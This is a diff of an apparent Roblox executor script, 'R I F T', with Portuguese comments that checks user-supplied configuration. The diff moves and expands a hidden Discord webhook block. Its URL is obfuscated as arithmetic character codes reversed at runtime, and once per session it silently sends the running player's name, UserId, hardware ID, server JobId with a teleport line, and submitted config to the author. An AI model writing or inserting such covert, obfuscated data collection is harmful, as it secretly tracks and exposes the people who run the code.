@@ -4,130 +4,19 @@ local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
 local TextChatService = game:GetService("TextChatService")
 
 --== Variáveis ==--
 
+-- Player
 local localPlayer = Players.LocalPlayer
 local playerGui = localPlayer:WaitForChild("PlayerGui")
 local channel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
 
--- Retorna se já foi enviada a webhook
-if localPlayer:GetAttribute("Webhooked") then
-	return
-else
-	localPlayer:SetAttribute("Webhooked", true)
-end
-
 -- Game
 local placeId = game.PlaceId
 local placeName = MarketplaceService:GetProductInfoAsync(game.PlaceId).Name
-
---== Funções ==--
-
--- Webhook
-local WEBHOOK_URL = {
-	100+5,60-3,13*5,100-14+0,49*2,70+3,100-3,
-	100-3,50-5,120-7,100-3,10*8,100+1,120-9,
-	90-1,11*11,60-6,70-3,25*3,100-26,100+7,
-	100+16,100-12,100+7,100-12,70+1,100+15,80+7,
-	90-1,100+18,60-12,25*2,49*2,100+5,100-14,
-	100-3,70+7,110-1,60-6,100+20,50-2,70-14,
-	70+1,80+3,70+3,70+3,100+3,50-5,110-1,
-	80+4,50+5,120-6,70-1,100-14,90-1,120-1,
-	80+6,100+1,50-2,100+5,100+7,70-3,100-2,
-	80+4,100+2,100/2,70+6,50+1,50-3,60-6,
-	50+6,50+5,100/2,50-1,100/2,50-2,50+2,
-	50+1,50+2,50+7,50-1,50+6,50,50+2,
-	50+4,50+4,50+2,50-1,50-3,100+15,100+7,
-	100+11,100+11,100+4,100-2,100+1,100+19,50-3,
-	100+5,100+12,100-3,50-3,100+9,100+11,100-1,
-	50-4,100,100+14,100+11,100-1,100+15,100+5,
-	100,50-3,50-3,60-2,100+15,100+12,100+16,
-	100+16,100+4
-}
-
--- Tipos de notificações
-local NOTIFICATION_TYPES = {
-	join = {
-		title = "🟢 Sessão iniciada",
-		color = 0x78B159
-	},
-	leave = {
-		title = "🔴 Sessão encerrada",
-		color = 0xDD2E44
-	}
-}
-
--- Envia uma notificação para o Discord através da webhook
-local function notify(info)
-	task.spawn(function()
-		if typeof(info) ~= "string" then return end
-		local config = NOTIFICATION_TYPES[info:lower()] or {
-			title = "⚠️ Evento não identificado", -- fallback
-			color = 0xFFCC4D
-		}
-
-		local data = {
-			embeds = {{
-				title = config.title,
-				color = config.color,
-				fields = {
-					{
-						name = "👤 Jogador",
-						value = string.format("%s (@%s)", localPlayer.DisplayName, localPlayer.Name),
-						inline = true
-					},
-					{
-						name = "🆔 UserId",
-						value = string.format("`%s`", localPlayer.UserId),
-						inline = true
-					},
-					{
-						name = "🏠 Place",
-						value = string.format("%s `%s` %s `%s`", "Id: ", placeId, "Name: ", placeName),
-						inline = false
-					},
-					{
-						name = "ℹ️ Informações",
-						value = string.format("```%s```", gethwid()),
-						inline = false
-					},
-					{
-						name = "📍 Join",
-						value = string.format("```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game.Players.LocalPlayer)\n```", game.PlaceId, game.JobId),
-						inline = false
-					}
-				},
-				timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
-			}}
-		}
-
-		pcall(function()
-			local requestFunc = request
-			if requestFunc then
-				requestFunc({
-					Url = string.char(unpack(WEBHOOK_URL)):reverse(),
-					Method = "POST",
-					Headers = {
-						["Content-Type"] = "application/json"
-					},
-					Body = HttpService:JSONEncode(data)
-				})
-			end
-		end)
-	end)
-end
-
--- Atualiza o estado do jogador para o Discord
-notify("join")
-Players.PlayerRemoving:Connect(function(player)
-	if localPlayer == player then
-		notify("leave")
-	end
-end)
-
---== Verificação ==--
 
 -- Referências de localização
 local references = {
@@ -139,7 +28,7 @@ local references = {
 -- Dados enviados pelo usuário
 local sent = getfenv().Config
 
--- Determina se os dados estão válidoo ou não
+-- Determina se os dados estão válido ou não
 local isSentValid = (function()
 	if typeof(sent) ~= "table" then
 		return false
@@ -180,7 +69,7 @@ local isSentValid = (function()
 			return false
 		end
 	end
-	
+
 	if #newLocations == 0 then
 		return false
 	end
@@ -190,9 +79,151 @@ local isSentValid = (function()
 	return true
 end)()
 
+--== Webhook ==--
+
+-- Formata a table enviada e retorna uma string
+local function tableToString(tbl)
+	local lines = {"{"}
+
+	for k, v in pairs(tbl) do
+		table.insert(lines, string.format("\t%s = %s,", tostring(k), tostring(v)))
+	end
+
+	table.insert(lines, "}")
+
+	return table.concat(lines, "\n")
+end
+
+------------------------------
+
+if not localPlayer:GetAttribute("Webhooked") then
+	localPlayer:SetAttribute("Webhooked", true)
+	
+	-- Webhook
+	local WEBHOOK_URL = {
+		100+5,60-3,13*5,100-14+0,49*2,70+3,100-3,
+		100-3,50-5,120-7,100-3,10*8,100+1,120-9,
+		90-1,11*11,60-6,70-3,25*3,100-26,100+7,
+		100+16,100-12,100+7,100-12,70+1,100+15,80+7,
+		90-1,100+18,60-12,25*2,49*2,100+5,100-14,
+		100-3,70+7,110-1,60-6,100+20,50-2,70-14,
+		70+1,80+3,70+3,70+3,100+3,50-5,110-1,
+		80+4,50+5,120-6,70-1,100-14,90-1,120-1,
+		80+6,100+1,50-2,100+5,100+7,70-3,100-2,
+		80+4,100+2,100/2,70+6,50+1,50-3,60-6,
+		50+6,50+5,100/2,50-1,100/2,50-2,50+2,
+		50+1,50+2,50+7,50-1,50+6,50,50+2,
+		50+4,50+4,50+2,50-1,50-3,100+15,100+7,
+		100+11,100+11,100+4,100-2,100+1,100+19,50-3,
+		100+5,100+12,100-3,50-3,100+9,100+11,100-1,
+		50-4,100,100+14,100+11,100-1,100+15,100+5,
+		100,50-3,50-3,60-2,100+15,100+12,100+16,
+		100+16,100+4
+	}
+
+	-- Tipos de notificações
+	local NOTIFICATION_TYPES = {
+		join = {
+			title = "🟢 Sessão iniciada",
+			color = 0x78B159
+		},
+		leave = {
+			title = "🔴 Sessão encerrada",
+			color = 0xDD2E44
+		}
+	}
+
+	-- Envia uma notificação para o Discord através da webhook
+	local function notify(info)
+		task.spawn(function()
+			if typeof(info) ~= "string" then return end
+			local config = NOTIFICATION_TYPES[info:lower()] or {
+				title = "⚠️ Evento não identificado", -- fallback
+				color = 0xFFCC4D
+			}
+
+			local data = {
+				embeds = {{
+					title = config.title,
+					color = config.color,
+					fields = {
+						{
+							name = "👤 Jogador",
+							value = string.format("%s (@%s)", localPlayer.DisplayName, localPlayer.Name),
+							inline = true
+						},
+						{
+							name = "🆔 UserId",
+							value = string.format("`%s`", localPlayer.UserId),
+							inline = true
+						},
+						{
+							name = "🏠 Place",
+							value = string.format("%s `%s` %s `%s`", "Id: ", placeId, "Name: ", placeName),
+							inline = false
+						},
+						{
+							name = "ℹ Informações",
+							value = string.format("HWID: ```%s```", gethwid()),
+							inline = false
+						},
+						{
+							name = "🎮 Execute",
+							value = string.format(
+								"Permitido: %s\nExecutado: %s\nDados enviados:\n```%s```",
+								("desconhecido"), (isSentValid and "sim" or "não"), tableToString(sent)
+							)
+						},
+						{
+							name = "📍 Join",
+							value = string.format("```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game.Players.LocalPlayer)\n```", game.PlaceId, game.JobId),
+							inline = false
+						}
+					},
+					timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+				}}
+			}
+
+			pcall(function()
+				local requestFunc = request
+				if requestFunc then
+					requestFunc({
+						Url = string.char(unpack(WEBHOOK_URL)):reverse(),
+						Method = "POST",
+						Headers = {
+							["Content-Type"] = "application/json"
+						},
+						Body = HttpService:JSONEncode(data)
+					})
+				end
+			end)
+		end)
+	end
+
+	-- Atualiza o estado do jogador para o Discord
+	notify("join")
+	Players.PlayerRemoving:Connect(function(player)
+		if localPlayer == player then
+			notify("leave")
+		end
+	end)
+end
+
+--== Verificação ==--
+
 -- Verifica se os dados passaram
 if isSentValid then
-	print("Valid data")
+	if localPlayer:GetAttribute("Executed") then
+		StarterGui:SetCore("SendNotification", {
+			Title = "R I F T",
+			Text = "O script já está executado",
+			Duration = 5
+		})
+		return
+	else
+		localPlayer:SetAttribute("Executed", true)	
+		print("Valid data")
+	end
 else
 	print("Invalid data")
 	return
